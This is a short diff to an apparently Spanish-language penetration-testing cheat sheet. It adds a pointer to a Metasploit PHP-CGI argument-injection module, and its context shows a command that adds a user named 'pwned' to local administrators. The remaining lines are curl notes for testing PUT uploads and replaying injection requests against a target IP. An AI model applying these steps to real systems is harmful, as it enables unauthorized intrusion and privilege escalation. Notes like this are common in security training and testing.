@@ -73,6 +73,7 @@ net localgroup administrators pwned /ADD
 
 
 #WEB
+PHP 5.X probable => exploit/multi/http/php_cgi_arg_injection
 curl -T [archivo a subir] [IP target] (Prueba si está habilitado PUT para subir un archivo a la IP mandada)
 curl --cookie "[cookie]" --location "[url que queramos ejecutar]"
 Si introducimos la url que aparece al hacer un Command Injection o SQL Injection con --data (capturándola con Burp por ejemplo) podemos hacer curl también y redirigir la salida haciendo | tee archivo.txt
